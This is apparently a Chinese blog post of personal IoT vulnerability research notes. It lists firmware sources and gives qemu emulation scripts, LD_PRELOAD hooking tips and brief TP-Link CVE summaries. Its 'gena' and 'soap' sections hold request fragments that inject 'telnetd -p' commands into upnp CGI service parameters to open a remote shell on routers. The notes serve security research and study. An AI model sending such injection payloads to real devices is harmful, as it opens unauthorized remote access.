---
title: IOT 漏洞挖掘记录
date: 2023-04-24 00:28:59 +0800
categories: [ctf比赛]
tags: [pwn, ctf]
permalink: /posts/id=62/
pin: false
published:
---

主要是在学习的过程中记录一些笔记

## 固件下载

**各大厂商的下载地址**

Tenda: https://www.tenda.com.cn/download/default.html

D-Link: https://tsd.dlink.com.tw/

TP-Link: https://resource.tp-link.com.cn/?source=index

华为: https://support.huawei.com/enterprise/zh/software/index.html

NETGEAR/网件: http://support.netgear.cn/

ASUS/华硕: https://www.asus.com.cn/support/download-center/

cisco/思科: https://software.cisco.com/download/home

linksys/领势: https://www.linksys.com/linksys-support

H3C: http://www.h3c.com/cn/Service/Document_Software/Software_Download/

FAST迅捷: https://service.fastcom.com.cn/download-list.html

水星: https://service.mercurycom.com.cn/download-list.html

OpenWrt: https://downloads.openwrt.org/

海康威视: https://www.hikvision.com/cn/support/Downloads/Device-upgrade-package/

**官网没有固件下载链接**

到第三方下载 https://drivers.mydrivers.com/s-0-0/h0-0-0-0-3-1-1.htm

小米: https://xiaomifirmwareupdater.com/、https://mirom.ezbox.idv.tw/en/

Cisco/思科: https://doc.lagout.org/network/Cisco/

## 系统镜像下载

```Bash
armel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armel/debian_wheezy_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-3.2.0-4-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-3.2.0-4-versatile
# 2.6.32
wget https://people.debian.org/~aurel32/qemu/armel/debian_squeeze_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-2.6.32-5-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-2.6.32-5-versatile

armhf:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress
wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress

mipsel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta

mips:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta
```

## 挖掘技巧tips和知识点

```sh
sudo vim /etc/ssh/sshd_config
PasswordAuthentication改成yes

vsnprintf(str, 0x400u, format, va);
按照format的格式（%s），将va传入str

例如 va是栈上列表/format为%S %S %S
+0000000C filename:.word ?
+00000010 re_addr:.word ?
+00000014 re_port:.word ?

str为 filename re_addr re_port

ida查找字段 Alt+t

fopen函数的mode参数有以下几种：
"r"：以只读方式打开文件。文件必须存在，否则打开失败。
"w"：以写方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则清空文件内容。
"a"：以追加方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则在文件末尾追加内容。
"r+"：以读写方式打开文件。文件必须存在，否则打开失败。
"w+"：以读写方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则清空文件内容。
"a+"：以读写方式打开文件。如果文件不存在，则创建文件；如果文件已存在，则在文件末尾追加内容。
除了以上六种模式外，还可以在模式字符串中添加"b"字符，表示以二进制方式打开文件。例如，"rb"表示以只读方式打开二进制文件。

bash脚本`ls`命令执行
使用 && 连接两个命令时，第二个命令只有在第一个命令成功执行（即返回状态码为0）之后才会执行

用FAP启动好固件后，需要用echo 0 > /proc/sys/kernel/randomize_va_space命令关闭地址随机化（ASLR）

# 在当前目录查找
grep -r "CVE-2022-45511" ./
```



hnap

upnp

```
cgibin会作为 “请求验证文件” ，对用户的请求进行验证并解析，再将解析后的数据传给对应的文件，进行下一步的操作。

SSDP（简单服务发现协议），SOAP（简单对象访问协议）与GENA（通用事件通知体系） ，其分别对应ssdpcgi（在/htdocs/upnp目录下），soap.cgi（在/htdocs/upnp/docs/LAN-1目录下），gena.cgi（在/htdocs/upnp/docs/LAN-1目录下）


/usr/sbin/upnp 中则包含了请求规则
```

SSDP

```
调用端口查询
/var/run/httpd.conf



# 称为HTTPU协议（即基于UDP的HTTP）


M-SEARCH * HTTP / 1.1  
host：239.255.255.250 ：1900  
MAN：ssdp：discover  
MX：10  
ST：ssdp:all

UUID
Universally Unique Identifier，通用唯一识别码。目的是让分布式系统中的所有元素，都有唯一辨识咨询，定义格式为：xxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx(8-4-4-16),分别为当前日期和时间，时钟序列，全局唯一的IEEE机器识别号，如果有网卡，从网卡mac地址获得，没有网卡以其他方式获得。
UDN
单一设备名（Unique Device Name），基于UUID，表示一个设备。在不同的时间，对于同一个设备此值应该是唯一的。
URN
URL的一种更新形式，统一资源名称(URN,Uniform Resource Name)。唯一标识一个实体的标识符，但是不能给出实体的位置。标识持久性Internet资源。URN可以提供一种机制，用于查找和检索定义特定命名空间的架构文件。尽管普通的URL可以提供类似的功能，但是在这方面，URN 更加强大并且更容易管理，因为 URN 可以引用多个 URL。
Mx
1到5之间的一个值，表示最大的等待应答的秒数。
ST
Seatch Targer，表示搜索的节点类型。

# 应答
HTTP/1.1 200 OK\r\n
CACHE-CONTROL: max-age=120\r\n
ST: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
USN: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
EXT:\r\n
SERVER: RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0\r\n
LOCATION: http://192.168.100.1:24795/rootDesc.xml\r\n
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n
01-NLS: 1652586384\r\n
BOOTID.UPNP.ORG: 1652586384\r\n
CONFIGID.UPNP.ORG: 1337\r\n
\r\n
```

gena

```
SUBCRIBE

request = b"SUBSCRIBE /gena.cgi?service=" + b"`telnetd -p 7777`" + b" HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Callback: http:///\r\n"
request += b"NT: upnp:event\r\n"
request += b"Timeout: Second-2333\r\n\r\n"
service=后面的内容，再先看到SUBCRIBE请求方式对应的sub_41A390函数：
```



soap

```
from socket import *
from os import *
from time import *
 
request = b"POST /soap.cgi?service=&&telnetd -p 8888&& HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 88\r\n"
request += b"SOAPAction: a#b\r\n\r\n"
```





## 漏洞复现记录

### Cisco

#### RV340(1.0.03.29 )

img固件，openwrt开发

7zip提取ubi镜像，将得到的ubi格式img用binwalk进行解压

依次启动nginx服务

```Bash
/etc/init.d/boot boot
generate_default_cert
/etc/init.d/confd start
/etc/init.d/nginx start
```

### tenda

#### w30e

似乎固件内没有完整的web页面文件，暂且搁置😢



漏洞点功能一般是在httpd

```shell
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static bin/httpd

#qemu启动httpd程序目，并开启调试端口
sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd


#查看可执行程序需要的动态链接库
readelf -d ./bin/httpd | grep NEEDED
#列出所有的函数名，与要寻找的函数对比
nm -D ./lib/libcommon.so

```

#### W20E(v15.11.0.6)

- qemu-arm-static可以直接使用**, **链接`webroot_ro`到`/webroot`
- 然后发现httpd无法监听80端口, 显示g_lan_ip=0.
- IDA和查看webroot_ro发现default.cfg中存了g_lan_ip, 为非零值, GetValue函数负责读取该文件. 
- 进到libcommon.so.0发现该函数和cfmd进程通信获取的该数值, 而cfmd的启动又需要mtd设备等等,  于是**自己写一个GetValue函数进行hook, 直接使用文件读取**: https://pastebin.ubuntu.com/p/8tQXJHQd3h/
- 查看`/lib`下的libc, 发现是uClibc, 编译参考[这里](https://iotsec-zone.com/article?id=202#4、Netgear  R8300固件模拟（qemu-user）):

```Bash
#compile lib.so
LD_LIBRARY_PATH=/root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib
apt install libelf-dev:i386  
ln -s /root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc /bin/ugcc
ugcc -shared -fPIC -Wall getvalue.c -o getvalue.so
#in chroot env:
./qemu-arm-static -E LD_PRELOAD=/getvalue.so /bin/httpd
```

- 发现无法登陆, 什么密码都不行. 于是找到登陆函数`authSecurityHandler`****patch跳过密码strcmp.
- 叕发现网页卡住了无法显示设置的选项和按钮,安装gdb-multiarch调试了下. 在网页卡住时ctrl+c中断后又继续运行, 就不卡了, 还显示`ucloud_p_sem: syscall interrupt`, **patch了ucloud_p_sem函数.**
- 某些poc就是在乱写, 发现在`parseFirstLine`函数中有URI too big的2048长度限制, 把一些栈溢出的长度改在这个限制之内即可验证. 



### TOTOLINK

#### A7000R\NR1800X\X5000R

通过github Action环境的docker+qemu-system系统模式搭建：

1.docker中安装qemu-system-mipsel，需要提前将固件文件系统上传到qemu启动的镜像文件中(本地使用tap起qemu将文件系统scp过去，或者别的方式也可以)

2.编写sh脚本实现qemu-system-mipsel自动登录

3.dockerfile编写安装需要的依赖

sh脚本(别的系统需要修改为对应系统名)

```Bash
cd /root/
/usr/bin/expect<<EOF
set timeout 10000

spawn qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic \
    -net user,hostfwd=tcp::80-:80 -nographic

expect "debian-mipsel login:"
send "root\r"

#expect "root@debian-mipsel:~# "
#send "echo 0 > /proc/sys/kernel/randomize_va_space\r"

expect "Password:"
send "root\r"

expect "root@debian-mipsel:~# "
send "mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc\r"

expect "root@debian-mipsel:~# "
send "chroot squashfs-root/ /bin/sh\r"

expect "# "
send "ifconfig\r"

expect "# "
send "./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf\r"
expect "# "

expect eof
EOF
#cd /root/squashfs-root
#./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf
sleep infinity;
```

Dockerfile

```Bash
FROM ubuntu:16.04

RUN apt update \
    && apt install -y qemu-system-mipsel \
    && apt install -y xz-utils \
    && apt install -y net-tools \
    && apt install -y expect \
    && apt install -y bridge-utils uml-utilities openssh-server

COPY debian_wheezy_mipsel_standard.qcow2 /root/debian_wheezy_mipsel_standard.qcow2

COPY vmlinux-3.2.0-4-4kc-malta /root/vmlinux-3.2.0-4-4kc-malta

COPY start.sh /root/start.sh

CMD [ "/bin/sh", "-c", "/root/start.sh" ]
```

构建好docker后，就可以将容器上传到自己的github仓库

然后exploit_db中使用的dockerfile可以直接这样

```Bash
FROM xxx/xxx:version
```

这样就能解决github action中跑docker，同时，docker上运行qemu-system的各种问题



### tp-LINK

#### TP-LINK ER5120G

CVE-2023-43138	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868n存在命令注入漏洞，攻击者在认证后添加NAPT规则，且规则名称带有注入点。
CVE-2023-43137	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868n存在命令注入漏洞，攻击者在认证后添加ACL规则，规则名称参数存在注入点。

CVE-2023-43135    TP-LINK ER5120G 4.0 2.0.0 Build 210817 Rel.80868n中存在未授权访问漏洞，攻击者无需身份验证即可获取设备敏感信息，获取用户令牌，最终登录设备后台管理。











## 快速启动

```shell
# 用户级qemu
sudo cp $(which qemu-arm-static) .
# sudo cp $(which qemu-mipsel-static) .
# sudo chroot . ./qemu-arm-static /lib/libc.so.6
sudo chroot . ./qemu-arm-static /bin/httpd

#-------------------------------------------------------------------
# 系统级qemu（桥接）
# 配置本机网卡
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.2.1/24

# 启动虚拟机
./start.sh
# qemu内网络配置
ifconfig eth0 192.168.2.2
# ifconfig eth1 192.168.2.2
service ssh start

# 上传文件系统-主机
tar czf rootfs.tar.gz ./rootfs
sudo scp ./rootfs.tar.gz root@192.168.2.2:/root/

# 上传文件系统-qemu
tar -zxvf ./rootfs.tar.gz
chmod -R 777 ./rootfs
# chmod -R 777 ./squashfs-root

# 挂载文件系统
mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc
# mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc
# mount -o bind /dev ./cpio-root/dev && mount -t proc /proc ./cpio-root/proc
chroot ./rootfs sh
# chroot ./squashfs-root sh
```

```shell
# start.sh

mipsel:
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
mips:
qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mips_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
armel:
qemu-system-arm \
    -M versatilepb \
    -kernel vmlinuz-3.2.0-4-versatile \
    -initrd initrd.img-3.2.0-4-versatile \
    -hda debian_wheezy_armel_standard.qcow2 \
    -append "root=/dev/sda1" -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic

armhf:
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2" -net nic \ 
    -net tap,ifname=tap0,script=no,downscript=no -nographic
    
arm64:
```





## patch & hook

HOOK一共有四种方法，分别是

+ LD_PRELOAD
+ dl_open
+ LD_LIBRARY_PATH
+ 直接针对二进制文件的patch

```shell
# 查看libc 信息
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static /lib/libc.so.6
or
strings ./lib/libc.so.0 | grep uClibc
```

### dl_open

```
mv libnvram.so libnvram_orig.so


```



### LD_PRELOAD

```shell
# glibc/eglibc编译 
arm-linux-gnueabi-gcc -shared -fPIC hook.c -o hook.so 


# uclibc 编译
cd ~/am-toolchains/brcm-arm-sdk/
export LD_LIBRARY_PATH="$PWD/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib"
# 基于 nvram_fake
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/nvram-faker/custom_nvram_r6250.c -o /home/ef4tless/nvram-faker/custom_nvram_r6250.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/nvram-faker/custom_nvram_r6250.o -o /home/ef4tless/nvram-faker/custom_nvram_r6250.so

# 基于 libnvram
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/libnvram/nvram.c -o /home/ef4tless/libnvram/firmadyne_nvram.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/libnvram/firmadyne_nvram.o -o /home/ef4tless/libnvram/firmadyne_libnvram.so


# 上传
scp ./hook.so root@192.168.2.2:/root/rootfs/

scp ./mini_httpd root@192.168.2.2:/root/rootfs/usr/sbin
```



```shell
# 运行
LD_PRELOAD=./hook.so ./usr/sbin/mini_httpd
# 注入环境变量
export LD_PRELOAD=./hook.so


# qemu usr mode / strace追踪
sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd
sudo chroot . ./qemu-arm-static -strace ./usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="./custom_nvram_r6250.so ./lib/libdl.so.0" /usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="/firmadyne_libnvram.so" ./usr/sbin/upnpd



# 查看启动端口
sudo lsof -i | grep qemu


# 按字符串搜索
cd rootfs
grep -r "mini_httpd" ./

```



## 打包docker



